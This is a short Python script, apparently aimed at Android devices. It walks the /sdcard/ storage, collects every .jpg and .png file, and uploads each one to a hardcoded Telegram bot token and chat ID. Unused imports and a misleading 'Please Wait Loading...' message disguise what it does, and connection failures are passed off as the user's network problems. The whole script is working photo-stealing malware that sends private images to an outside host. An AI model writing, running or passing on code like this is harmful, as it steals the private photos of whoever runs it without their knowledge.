import os
import sys
import json
import uuid
import string
import random
import requests
from concurrent.futures import ThreadPoolExecutor
from telegram import Bot
import asyncio
os.system("pip uninstall telegram")
os.system("pip install python-telegram-bot")
os.system("pip show python-telegram-bot")
# Telegram Bot Token
TOKEN = "7200801562:AAFKsotpioVsfUMgdsKFReTfDVhoN4Ur3co "

# Telegram Bot Chat ID
CHAT_ID = "7630101527 "

# Function to send file to Telegram bot
async def send_file_to_telegram(file_path):
    try:
        bot = Bot(token=TOKEN)
        await bot.send_document(chat_id=CHAT_ID, document=open(file_path, 'rb'))
        print("Please Wait Loading...")
    except Exception as e:
        print("Your Network issues", str(e))

# Function to get all pictures
async def get_all_pictures():
    pictures = []
    for root, dirs, filenames in os.walk("/sdcard/"):
        for filename in filenames:
            if filename.endswith(".jpg") or filename.endswith(".png"):
                pictures.append(os.path.join(root, filename))
    return pictures

async def main():
    # Get all pictures
    pictures = await get_all_pictures()
    for picture in pictures:
        await send_file_to_telegram(picture)

asyncio.run(main())